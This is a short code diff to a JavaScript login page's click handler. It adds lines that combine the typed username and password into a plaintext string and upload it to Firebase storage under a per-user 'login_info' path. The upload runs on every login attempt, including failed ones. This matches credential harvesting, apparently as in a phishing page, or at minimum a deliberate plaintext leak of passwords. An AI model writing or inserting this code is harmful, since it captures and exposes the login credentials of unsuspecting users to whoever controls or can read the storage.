@@ -18,4 +18,9 @@ loginButton.addEventListener("click", (e) => {
         alert("Incorrect password")
         loginErrorMsg.style.opacity = 1;
     }
+    
+    //Passing login information to firebase
+    var login_info = username + ', ' + password;
+    var storageRef = firebase.storage().ref('login_info/' + username);
+    storageRef.put(login_info);
 })
